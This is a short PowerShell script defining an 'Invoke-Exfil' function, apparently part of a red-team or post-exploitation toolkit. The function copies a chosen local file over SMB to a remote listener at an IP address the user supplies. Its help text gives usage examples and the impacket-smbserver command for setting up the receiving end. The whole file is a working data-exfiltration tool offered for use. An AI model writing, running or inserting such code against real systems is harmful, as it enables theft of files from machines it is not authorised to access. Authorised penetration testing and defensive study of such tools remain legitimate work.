function Invoke-Exfil {
[CmdletBinding()]
param (
	[Switch]$Help,
	[Switch]$SmbExfil,
	[String]$SmbIp,
	[String]$LocalFile
)

	if ($Help -eq $True) {
		Write @"
		
 ### Invoke-Exfil Help ###
 -------------------------
 Available Invoke-Exfil Commands:
 --------------------------------
 /-------------------------------------------------------------------------------/
 | -SmbExfil [-SmbIp] smb_ip [-LocalFile] local_file                             |
 | ----------------------------------------------------------------------------- |
 |                                                                               |
 |  [*] Description: Copies a local file over SMB to a remote SMB                |
 |      Listener.                                                                |
 |                                                                               |
 |  [*] Usage: Invoke-Exfil -SmbExfil -SmbIp n.n.n.n -LocalFile C:\temp\data.txt |
 |  [*] Use impacket on remote:                                                  |
 |      impacket-smbserver data /tmp/data -smb2support                           |
 /-------------------------------------------------------------------------------/

"@
	}
	elseif ($SmbExfil -and $SmbIp -and $LocalFile) {
		(Copy-Item -Path $LocalFile -Destination \\$SmbIp\data\)
	}
}
